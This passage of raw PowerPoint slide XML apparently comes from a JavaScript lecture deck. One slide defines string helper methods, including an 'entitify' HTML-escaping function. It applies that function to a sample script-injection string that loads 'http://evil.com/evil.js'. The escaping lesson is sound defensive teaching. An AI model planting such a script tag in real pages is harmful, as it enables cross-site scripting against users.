                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>hacker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>='http://evil.com/evil.js'&gt;&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EE0000"/>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script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Pretending</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Good</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br>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>String</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>prototype</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lastCharacter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</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this</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charAt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>this</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>length</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>1</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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="267F99"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>String</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C1"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>prototype</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entitify</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>this</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replace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/&amp;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>g</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"&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>amp</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replace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/&lt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>g</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"&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>lt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replace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/&gt;/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>g</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"&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>gt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replace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/"/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>g</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"&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>quot</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replace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="811F3F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/'/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>g</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>apos</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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>document</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write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">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s</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lastCharacter</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"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>document</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write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>hacker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>entitify</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"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>);</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" sz="1800" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="1800" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49"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023D6216-8F13-4FEF-B4CD-3745F4F83C88}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Classic Style Constructor</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="106499" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{426199F7-6139-4212-B42C-A2AF031511B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4983163"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>Syntax &amp; usage:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>function </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ClassName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(params) {</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>this.property</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = …;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>newObject</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = new </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
